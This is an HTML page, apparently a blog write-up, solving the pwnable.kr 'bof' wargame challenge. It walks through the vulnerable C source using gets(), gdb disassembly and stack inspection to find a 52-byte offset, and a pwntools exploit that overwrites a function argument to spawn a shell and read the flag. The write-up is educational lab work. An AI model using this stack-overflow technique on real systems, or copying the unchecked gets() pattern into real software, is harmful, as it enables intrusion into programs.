@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<h1 id="bof">bof</h1>
+<p>2nd April 2022</p>
+<p>Read the source.</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span></span>{
+        <span class="hljs-keyword">char</span> overflowme[<span class="hljs-number">32</span>];
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"overflow me : "</span>);
+        gets(overflowme);       <span class="hljs-comment">// smash me!</span>
+        <span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xcafebabe</span>){
+                system(<span class="hljs-string">"/bin/sh"</span>);
+        }
+        <span class="hljs-keyword">else</span>{
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Nah..\n"</span>);
+        }
+}
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>{
+        func(<span class="hljs-number">0xdeadbeef</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>To get a shell we need to overwrite the <code>0xdeadbeef</code> function argument with <code>0xcafebabe</code>.
+The <code>overflowme</code> variable is 32 bytes, so I started with 48 to reach the <code>0xdeadbeef</code> 
+function argument just on a whim.  </p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pwnable</span>.<span class="hljs-keyword">kr</span>/<span class="hljs-keyword">toddlers_bottle</span>/<span class="hljs-keyword">bof</span>]
+└─$ python2 -c <span class="hljs-string">'import sys; sys.stdout.write("A"*48+"\xBE\xBA\xFE\xCA")'</span> &gt; in.raw
+</code></pre><p>Start the program in gdb and set a breakpint on the <code>cmp</code>.
+<code>cmp    DWORD PTR [ebp+0x8],0xcafebabe</code></p>
+<pre><code>┌──(horace@kali)-[~/ctf/pwnable.kr/toddlers_bottle/bof]
+└─$ gdb -q bof           
+pwndbg&gt; disass func
+Dump of assembler code for function func:
+   <span class="hljs-number">0x5655562c</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
+   <span class="hljs-number">0x5655562d</span> &lt;+<span class="hljs-number">1</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>
+   <span class="hljs-number">0x5655562f</span> &lt;+<span class="hljs-number">3</span>&gt;:     <span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x48</span>
+   <span class="hljs-number">0x56555632</span> &lt;+<span class="hljs-number">6</span>&gt;:     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">gs</span>:<span class="hljs-number">0x14</span>
+   <span class="hljs-number">0x56555638</span> &lt;+<span class="hljs-number">12</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>],<span class="hljs-built_in">eax</span>
+   <span class="hljs-number">0x5655563b</span> &lt;+<span class="hljs-number">15</span>&gt;:    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>
+   <span class="hljs-number">0x5655563d</span> &lt;+<span class="hljs-number">17</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">esp</span>],<span class="hljs-number">0x5655578c</span>
+   <span class="hljs-number">0x56555644</span> &lt;+<span class="hljs-number">24</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xf7e254e0</span> &lt;__GI__IO_puts&gt;
+   <span class="hljs-number">0x56555649</span> &lt;+<span class="hljs-number">29</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x2c</span>]
+   <span class="hljs-number">0x5655564c</span> &lt;+<span class="hljs-number">32</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">esp</span>],<span class="hljs-built_in">eax</span>
+   <span class="hljs-number">0x5655564f</span> &lt;+<span class="hljs-number">35</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xf7e24a00</span> &lt;_IO_gets&gt;
+   <span class="hljs-number">0x56555654</span> &lt;+<span class="hljs-number">40</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>+<span class="hljs-number">0x8</span>],<span class="hljs-number">0xcafebabe</span>
+   <span class="hljs-number">0x5655565b</span> &lt;+<span class="hljs-number">47</span>&gt;:    <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x5655566b</span> &lt;func+<span class="hljs-number">63</span>&gt;
+   <span class="hljs-number">0x5655565d</span> &lt;+<span class="hljs-number">49</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">esp</span>],<span class="hljs-number">0x5655579b</span>
+   <span class="hljs-number">0x56555664</span> &lt;+<span class="hljs-number">56</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xf7dfad00</span> &lt;__libc_system&gt;
+   <span class="hljs-number">0x56555669</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x56555677</span> &lt;func+<span class="hljs-number">75</span>&gt;
+   <span class="hljs-number">0x5655566b</span> &lt;+<span class="hljs-number">63</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">esp</span>],<span class="hljs-number">0x565557a3</span>
+   <span class="hljs-number">0x56555672</span> &lt;+<span class="hljs-number">70</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xf7e254e0</span> &lt;__GI__IO_puts&gt;
+   <span class="hljs-number">0x56555677</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xc</span>]
+   <span class="hljs-number">0x5655567a</span> &lt;+<span class="hljs-number">78</span>&gt;:    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">gs</span>:<span class="hljs-number">0x14</span>
+   <span class="hljs-number">0x56555681</span> &lt;+<span class="hljs-number">85</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x56555688</span> &lt;func+<span class="hljs-number">92</span>&gt;
+   <span class="hljs-number">0x56555683</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0xf7ecc8e0</span> &lt;__stack_chk_fail&gt;
+   <span class="hljs-number">0x56555688</span> &lt;+<span class="hljs-number">92</span>&gt;:    <span class="hljs-keyword">leave</span>  
+   <span class="hljs-number">0x56555689</span> &lt;+<span class="hljs-number">93</span>&gt;:    <span class="hljs-keyword">ret</span>    
+End of assembler dump.
+pwndbg&gt; <span class="hljs-built_in">bp</span> <span class="hljs-number">0x56555654</span>
+Breakpoint <span class="hljs-number">1</span> <span class="hljs-meta">at</span> <span class="hljs-number">0x56555654</span>
+pwndbg&gt; r &lt; <span class="hljs-keyword">in</span>.raw
+Starting program: /home/horace/ctf/pwnable.kr/toddlers_bottle/bof/bof &lt; <span class="hljs-keyword">in</span>.raw
+overflow me : 
+
+Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x56555654</span> <span class="hljs-keyword">in</span> func ()
+<span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────
+ <span class="hljs-built_in">EAX</span>  <span class="hljs-number">0xffffd01c</span> ◂— <span class="hljs-number">0x41414141</span> (<span class="hljs-string">'AAAA'</span>)
+ <span class="hljs-built_in">EBX</span>  <span class="hljs-number">0x0</span>
+ <span class="hljs-built_in">ECX</span>  <span class="hljs-number">0xf7fa1580</span> (_IO_2_1_stdin_) ◂— <span class="hljs-number">0xfbad2098</span>
+ <span class="hljs-built_in">EDX</span>  <span class="hljs-number">0xfbad2098</span>
+ <span class="hljs-built_in">EDI</span>  <span class="hljs-number">0x56555530</span> (_start) ◂— <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">ebp</span>
+ <span class="hljs-built_in">ESI</span>  <span class="hljs-number">0x1</span>
+ <span class="hljs-built_in">EBP</span>  <span class="hljs-number">0xffffd048</span> ◂— <span class="hljs-number">0x41414141</span> (<span class="hljs-string">'AAAA'</span>)
+ <span class="hljs-built_in">ESP</span>  <span class="hljs-number">0xffffd000</span> —▸ <span class="hljs-number">0xffffd01c</span> ◂— <span class="hljs-number">0x41414141</span> (<span class="hljs-string">'AAAA'</span>)
+ <span class="hljs-built_in">EIP</span>  <span class="hljs-number">0x56555654</span> (func+<span class="hljs-number">40</span>) ◂— <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> + <span class="hljs-number">8</span>], <span class="hljs-number">0xcafebabe</span>
+────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────
+ ► <span class="hljs-number">0x56555654</span> &lt;func+<span class="hljs-number">40</span>&gt;    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> + <span class="hljs-number">8</span>], <span class="hljs-number">0xcafebabe</span>
+
+[...]
+
+pwndbg&gt; x/40w <span class="hljs-number">0xffffd048</span>
+<span class="hljs-number">0xffffd048</span>:     <span class="hljs-number">0x41414141</span>      <span class="hljs-number">0xcafebabe</span>      <span class="hljs-number">0xdeadbe00</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd058</span>:     <span class="hljs-number">0x565556b9</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x56555530</span>
+<span class="hljs-number">0xffffd068</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7dd4905</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd114</span>
+<span class="hljs-number">0xffffd078</span>:     <span class="hljs-number">0xffffd11c</span>      <span class="hljs-number">0xffffd0a4</span>      <span class="hljs-number">0xffffd0b4</span>      <span class="hljs-number">0xf7ffdb98</span>
+<span class="hljs-number">0xffffd088</span>:     <span class="hljs-number">0xf7fc3420</span>      <span class="hljs-number">0xf7fa1000</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd098</span>:     <span class="hljs-number">0xffffd0f8</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7ffd000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd0a8</span>:     <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x56555530</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x4df9e250</span>
+<span class="hljs-number">0xffffd0b8</span>:     <span class="hljs-number">0x08c87e40</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffd0c8</span>:     <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x56555530</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7fe1ce0</span>
+<span class="hljs-number">0xffffd0d8</span>:     <span class="hljs-number">0xf7fdc480</span>      <span class="hljs-number">0x56556ff4</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x56555530</span>
+</code></pre><p>The assembly is comparing <code>0xcafebabe</code> to the value at EBP + 8: <code>0xffffd048 + 8</code>. 
+I examined memory at EBP above, and can see that <code>0xdeadbeef</code>, the function argument, 
+is at <code>0xffffd048 + 8</code> and <code>0xcafebabe</code>, the value we submitted, is at <code>0xffffd048 + 4</code>.</p>
+<p>This means the offset to overwrite the <code>0xdeadbeef</code> function argument is 52 bytes.
+You can also figure this out by looking at the size of the stack from ESP to EBP:</p>
+<pre><code> <span class="hljs-built_in">EBP</span>  <span class="hljs-number">0xffffd048</span>
+ <span class="hljs-built_in">ESP</span>  <span class="hljs-number">0xffffd000</span>
+</code></pre><p>Here&#39;s my exploit code.</p>
+<pre><code class="lang-python">#!/usr/bin/env python3
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+#context.log_level = <span class="hljs-string">'debug'</span>
+
+p  = b<span class="hljs-string">"A"</span>*<span class="hljs-number">52</span>
+p += p32(<span class="hljs-number">0xcafebabe</span>)
+
+<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">"pwnable.kr"</span>, <span class="hljs-number">9000</span>)
+<span class="hljs-built_in">io</span>.sendline(p)
+<span class="hljs-built_in">io</span>.interactive()
+</code></pre>
+<pre><code>┌──(horace@kali)-[~/ctf/pwnable.kr/toddlers_bottle/bof]
+└─$ python3 exp.py
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ ls -alh
+total 21M
+drwxr-x---  <span class="hljs-number"> 3 </span>root bof  4.0K Sep <span class="hljs-number"> 3 </span><span class="hljs-number"> 2021 </span>.
+drwxr-xr-x<span class="hljs-number"> 116 </span>root root 4.0K Nov<span class="hljs-number"> 11 </span>14:52 ..
+d---------  <span class="hljs-number"> 2 </span>root root 4.0K Jun<span class="hljs-number"> 12 </span><span class="hljs-number"> 2014 </span>.bash_history
+-r-xr-x---  <span class="hljs-number"> 1 </span>root bof  7.2K Sep<span class="hljs-number"> 12 </span><span class="hljs-number"> 2016 </span>bof
+-rw-r--r--  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 308 </span>Oct<span class="hljs-number"> 23 </span><span class="hljs-number"> 2016 </span>bof.c
+-r--r-----  <span class="hljs-number"> 1 </span>root bof   <span class="hljs-number"> 32 </span>Jun<span class="hljs-number"> 11 </span><span class="hljs-number"> 2014 </span>flag
+-rw-------  <span class="hljs-number"> 1 </span>root root  21M Apr <span class="hljs-number"> 2 </span>06:07 log
+-rw-r--r--  <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 0 </span>Oct<span class="hljs-number"> 23 </span><span class="hljs-number"> 2016 </span>log2
+-rwx------  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 760 </span>Sep<span class="hljs-number"> 11 </span><span class="hljs-number"> 2014 </span>super.pl
+$ cat flag
+daddy, I just pwned a buFFer :)
+</code></pre>
